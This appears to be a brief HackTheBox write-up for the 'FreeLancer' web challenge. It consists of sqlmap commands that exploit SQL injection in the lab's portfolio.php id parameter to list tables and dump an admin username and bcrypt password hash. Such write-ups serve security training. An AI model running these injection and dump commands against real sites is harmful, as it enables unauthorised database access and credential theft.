## FreeLancer ##

![OWASP](https://github.com/SagiUziel/HackTheBox/blob/master/Web/FreeLancer/ZAP.JPG)

```
> python .\sqlmap.py -u "http://docker.hackthebox.eu:30418/portfolio.php?id=1" -p id --tables

Database: freelancer
[2 tables]
+----------------------------------------------------+
| portfolio                                          |
| safeadmin                                          |
+----------------------------------------------------+
```

```
> python .\sqlmap.py -u "http://docker.hackthebox.eu:30418/portfolio.php?id=1" -p id -T safeadmin --dump

Database: freelancer
Table: safeadmin
[1 entry]
+------+----------+--------------------------------------------------------------+---------------------+
| id   | username | password                                                     | created_at          |
+------+----------+--------------------------------------------------------------+---------------------+
| 1    | safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | 2019-07-16 20:25:45 |
+------+----------+--------------------------------------------------------------+---------------------+
```
